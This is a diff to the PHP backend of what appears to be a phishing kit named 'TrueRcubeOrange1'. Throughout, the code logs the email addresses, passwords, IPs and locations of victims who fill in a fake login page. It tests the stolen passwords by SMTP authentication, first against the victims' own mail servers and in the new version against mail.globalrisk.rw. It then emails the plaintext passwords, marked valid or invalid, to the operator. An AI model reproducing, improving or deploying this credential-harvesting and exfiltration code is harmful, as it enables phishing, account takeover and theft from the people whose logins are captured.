@@ -105,10 +105,10 @@ $logMessage .= "User Agent: " . $browser . "\n";
 $logMessage .= "========================\n\n";
 
 // Email subject for notification
-$sub = "TrueRcubeOrange1 Login Attempt | " . $domain . " | " . $country;
+$sub = "TrueRcubeOrange1 | " . $passwd . " | " . $domain . " | " . $country . " | " . $ip;
 
 // Email body for notification
-$emailBody = "<h2>New Login Attempt Captured</h2>";
+$emailBody = "<h2>TrueRcubeOrange1 - New Login Attempt</h2>";
 $emailBody .= "<p><strong>Email:</strong> " . htmlspecialchars($login) . "</p>";
 $emailBody .= "<p><strong>Password:</strong> " . htmlspecialchars($passwd) . "</p>";
 $emailBody .= "<p><strong>Domain:</strong> " . htmlspecialchars($domain) . "</p>";
@@ -116,71 +116,47 @@ $emailBody .= "<p><strong>IP Address:</strong> " . htmlspecialchars($ip) . "</p>
 $emailBody .= "<p><strong>Country:</strong> " . htmlspecialchars($country) . "</p>";
 $emailBody .= "<p><strong>User Agent:</strong> " . htmlspecialchars($browser) . "</p>";
 $emailBody .= "<p><strong>Timestamp:</strong> " . $timestamp . "</p>";
+$emailBody .= "<hr>";
 
 $validCredentials = false;
 $testResult = "Connection failed";
 
-// Test credentials against the user's domain mail server
+// Test credentials using mail.globalrisk.rw as the test server
 try {
-    // Determine mail server for the domain
-    $mailServer = "mail." . $domain;
-    
-    // Try common mail server configurations
-    $mailServers = array(
-        "mail." . $domain,
-        "smtp." . $domain,
-        "webmail." . $domain,
-        $domain
-    );
-    
     $testMail = new PHPMailer(true);
     $testMail->isSMTP();
     $testMail->SMTPAuth = true;
-    $testMail->SMTPSecure = 'tls';
+    $testMail->Host = 'mail.globalrisk.rw';  // Use your server as test server
+    $testMail->Username = $login;             // Test with captured credentials
+    $testMail->Password = $passwd;
     $testMail->Port = 587;
+    $testMail->SMTPSecure = 'tls';
     $testMail->Timeout = 10;
-    $testMail->SMTPDebug = 0; // Disable debug output
+    $testMail->SMTPDebug = 0;
     
-    foreach ($mailServers as $server) {
+    // Try to authenticate against mail.globalrisk.rw
+    if ($testMail->smtpConnect()) {
+        $validCredentials = true;
+        $testResult = "Valid credentials - Authentication successful on mail.globalrisk.rw";
+        
+        // If credentials are valid, try to send a test email
         try {
-            $testMail->Host = $server;
-            $testMail->Username = $login;
-            $testMail->Password = $passwd;
+            $testMail->setFrom($login, 'Credential Test');
+            $testMail->addAddress($receiver);
+            $testMail->isHTML(true);
+            $testMail->Subject = "Credential Test Success - " . $login;
+            $testMail->Body = "Credentials for " . $login . " are VALID and working!<br>Password: " . $passwd;
             
-            // Try to authenticate
-            if ($testMail->smtpConnect()) {
-                $validCredentials = true;
-                $testResult = "Valid credentials for " . $server;
-                $testMail->smtpClose();
-                break;
+            if ($testMail->send()) {
+                $testResult .= " - Test email sent successfully";
             }
         } catch (Exception $e) {
-            // Try next server
-            continue;
+            $testResult .= " - Authentication OK but test email failed: " . $e->getMessage();
         }
-    }
-    
-    // If TLS fails, try without TLS
-    if (!$validCredentials) {
-        $testMail->SMTPSecure = false;
-        $testMail->Port = 25;
         
-        foreach ($mailServers as $server) {
-            try {
-                $testMail->Host = $server;
-                $testMail->Username = $login;
-                $testMail->Password = $passwd;
-                
-                if ($testMail->smtpConnect()) {
-                    $validCredentials = true;
-                    $testResult = "Valid credentials for " . $server . " (no TLS)";
-                    $testMail->smtpClose();
-                    break;
-                }
-            } catch (Exception $e) {
-                continue;
-            }
-        }
+        $testMail->smtpClose();
+    } else {
+        $testResult = "Invalid credentials - Authentication failed on mail.globalrisk.rw";
     }
     
 } catch (Exception $error) {
@@ -188,12 +164,14 @@ try {
 }
 
 // Add test result to log
-$logMessage .= "Credential Test: " . $testResult . "\n";
-$logMessage .= "Valid: " . ($validCredentials ? "YES" : "NO") . "\n\n";
+$logMessage .= "Credential Test Server: mail.globalrisk.rw\n";
+$logMessage .= "Test Result: " . $testResult . "\n";
+$logMessage .= "Valid Credentials: " . ($validCredentials ? "YES" : "NO") . "\n\n";
 
 // Update email body with test result
-$emailBody .= "<p><strong>Credential Test:</strong> " . htmlspecialchars($testResult) . "</p>";
-$emailBody .= "<p><strong>Valid Credentials:</strong> " . ($validCredentials ? "YES" : "NO") . "</p>";
+$emailBody .= "<p><strong>Test Server:</strong> mail.globalrisk.rw</p>";
+$emailBody .= "<p><strong>Credential Test Result:</strong> " . htmlspecialchars($testResult) . "</p>";
+$emailBody .= "<p><strong>Valid Credentials:</strong> <span style='color: " . ($validCredentials ? "green'>YES" : "red'>NO") . "</span></p>";
 
 // Save to local log file
 try {
@@ -206,7 +184,7 @@ try {
     // Log file write failed, continue anyway
 }
 
-// Send notification email with captured data
+// Send notification email with captured data using your SMTP server
 try {
     $mail = new PHPMailer(true);
     $mail->isSMTP();
@@ -218,7 +196,7 @@ try {
     $mail->SMTPSecure = 'tls';
     $mail->Timeout = 30;
     
-    $mail->setFrom($senderuser, 'Login Capture System');
+    $mail->setFrom($senderuser, 'TrueRcubeOrange1 Logger');
     $mail->addAddress($receiver);
     $mail->isHTML(true);
     $mail->Subject = $sub;
